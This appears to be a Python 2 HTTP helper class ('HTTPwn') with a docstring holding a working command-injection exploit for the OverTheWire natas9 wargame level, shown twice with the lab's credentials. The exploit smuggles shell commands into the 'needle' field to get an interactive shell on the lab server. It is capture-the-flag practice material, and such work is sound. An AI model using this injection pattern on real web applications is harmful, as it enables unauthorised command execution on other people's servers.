import urllib2, urllib, cookielib
import useragents as ua

class HTTPwn(object):

    headers = None
    html = None

    def __init__(self, ua=True):
        self.jar           = cookielib.CookieJar()
        self.cookieHandler = urllib2.HTTPCookieProcessor(self.jar)
        self.opener   = urllib2.build_opener(self.cookieHandler)
        if ua:
            self.add_uaheaders()


    def login(self, url, username, password, data=None):
        passman = urllib2.HTTPPasswordMgrWithDefaultRealm()
        passman.add_password(None, url, username, password)
        authhandler  = urllib2.HTTPBasicAuthHandler(passman)
        self.opener.add_handler(authhandler)
        self.open(url, data)


    def open(self, url, data=None):
        if isinstance(data, dict):
            data = urllib.urlencode(data)
        try:
            url_fd  = self.opener.open(url, data)
        except:
            print "Something went wrong, site not fetched correctly"
            return False
        self.headers = url_fd.headers.dict
        self.html    = url_fd.read()            
        return True


    def add_uaheaders(self):
        self.opener.addheaders = [('User-agent', ua.randomua())]
        return self.opener.addheaders


'''
PROOF OF CONCEPT:
***The following exploit:***

#!/usr/bin/env python3
import urllib2, cookielib
from pwn import *
from urllib import urlencode
from xml.sax.saxutils import unescape
import re
import json
import random
import string
from time import sleep


site="http://natas9.natas.labs.overthewire.org"
jar = cookielib.CookieJar()
passman = urllib2.HTTPPasswordMgrWithDefaultRealm()
passman.add_password(None, site,"natas9","sQ6DKR8ICwqDMTd48lQlJfbF1q9B3edT")
authhandler = urllib2.HTTPBasicAuthHandler(passman)
opener = urllib2.build_opener(authhandler)
urllib2.install_opener(opener)

while True:
    s = raw_input('> ')
    if not s:
        break
    print re.findall('<pre>(.*)</pre>', urllib2.urlopen(site, urlencode({'needle': '; ' + s + ' #'})).read(), re.S)[0].strip()



***can be rewritten to:***

#!/usr/bin/env python3
from pwn import *
import re

purl = HTTPwn()
site="http://natas9.natas.labs.overthewire.org"
purl.login(site, "natas9", "sQ6DKR8ICwqDMTd48lQlJfbF1q9B3edT")

while True:
    s = raw_input('> ')
    if not s:
        break
    purl.open(site, {'needle': '; ' + s + ' #'})
    print re.findall('<pre>(.*)</pre>', purl.html, re.S)[0].strip()


much easier to see what the hell is going on, while also saving a few lines of code,
obviously not counting useless imports...
whoever wrote the original exploit needs to be slapped around with a large trout.
'''
